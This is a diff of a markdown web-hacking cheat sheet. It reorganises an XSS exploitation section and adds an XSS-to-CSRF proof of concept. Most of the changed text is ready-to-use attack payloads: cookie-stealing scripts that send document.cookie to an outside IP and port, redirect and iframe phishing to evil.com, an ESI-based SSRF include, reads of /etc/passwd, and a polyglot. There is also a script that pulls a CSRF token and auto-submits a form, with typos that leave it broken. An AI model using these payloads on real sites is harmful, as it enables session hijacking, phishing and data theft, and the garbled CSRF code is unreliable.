@@ -143,40 +143,68 @@
     
 - **XSS Exploitation**
     
-    ```html
-    # Some XSS exploitations
-    - host header injection through xss
-    add referer: batman 
-    hostheader: bing.com">script>alert(document.domain)</script><"
-    - URL redirection through xss
-    - document.location.href="http://evil.com"
-    - phishing through xss - iframe injection
-    <iframe src="http://evil.com" height="100" width="100"></iframe>
-    - Cookie stealing through xss
-    https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py
-    https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md
-    <script>var i=new Image;i.src="http://172.30.5.46:8888/?"+document.cookie;</script>
-    <img src=x onerror=this.src='http://172.30.5.46:8888/?'+document.cookie;>
-    <img src=x onerror="this.src='http://172.30.5.46:8888/?'+document.cookie; this.removeAttribute('onerror');">
-    -  file upload  through xss
-    upload a picturefile, intercept it, change picturename.jpg to xss paylaod using intruder attack
-    -  remote file inclusion (RFI) through xss
-    php?=http://brutelogic.com.br/poc.svg - xsspayload
-    - convert self xss to reflected one
-    copy response in a file.html -> it will work
-    
-    # XSS to SSRF
-    <esi:include src="http://yoursite.com/capture" />
-    
-    # XSS to LFI
-    <script>	x=new XMLHttpRequest;	x.onload=function(){		document.write(this.responseText)	};	x.open("GET","file:///etc/passwd");	x.send();</script>
-    
-    <img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
-    <script>document.write('<iframe src=file:///etc/passwd></iframe>');</scrip>
-    # XSS To CSRF 
-        
-    ```
-    
+   ```html
+# Some XSS exploitations
+
+## host header injection through xss
+hostheader: bing.com">script>alert(document.domain)</script><"
+
+## URL redirection through xss
+document.location.href="http://evil.com"
+
+## phishing through xss - iframe injection
+<iframe src="http://evil.com" height="100" width="100"></iframe>
+
+## Cookie stealing through xss
+https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py
+https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md
+<script>var i=new Image;i.src="http://172.30.5.46:8888/?"+document.cookie;</script>
+<img src=x onerror=this.src='http://172.30.5.46:8888/?'+document.cookie;>
+<img src=x onerror="this.src='http://172.30.5.46:8888/?'+document.cookie; this.removeAttribute('onerror');">
+
+## file upload  through xss
+upload a picturefile, intercept it, change picturename.jpg to xss paylaod using intruder attack
+
+## remote file inclusion (RFI) through xss
+php?=http://brutelogic.com.br/poc.svg - xsspayload
+
+## convert self xss to reflected one
+copy response in a file.html -> it will work
+
+# XSS to SSRF
+<esi:include src="http://yoursite.com/capture" />
+
+# XSS to LFI
+<script>	x=new XMLHttpRequest;	x.onload=function(){ document.write(this.responseText)	};	x.open("GET","file:///etc/passwd");	x.send();</script>
+
+<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+<script>document.write('<iframe src=file:///etc/passwd></iframe>');</scrip>
+```
+
+### XSS to CSRF [ [https://link.medium.com/ct4S2BiJYwb](https://link.medium.com/ct4S2BiJYwb) ]
+
+POC : `[https://vulnerable.site/profile.php?msg=<](https://vulnerable.site/profile.php?msg=<script)scriptsrc=’https://attacker.site/attacker/script.js’></script>`
+
+```jsx
+var csrfProtectedPage ='https://vulnerable.site/profile.php'
+var csrfProtectedForm ='form'
+//get valid token for current request
+var html = get(csrfProtectedPage);
+	document.getElementbyId(csrfProtectedForm);
+var token = form.token.value;
+
+//Build with valid token 
+document.body.innerHTML+='form id="myform"action="+csrfProtectedPage+"method="POST">'+'<input id="password"name="name"value="hacked">'+'</form>';
+
+// Auto submit form 
+document.forms["myfor"].submit();
+function get(url){
+var xmlHttp = new XMLHttpRequest();
+xamlHttp.open("GET", url.false);
+xmlGttp.send(null)
+return xmlHttp.responseText;
+}
+```
 - **XSS Polygots**
 ```jsx
 javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*<svg/*/onload=alert()//>
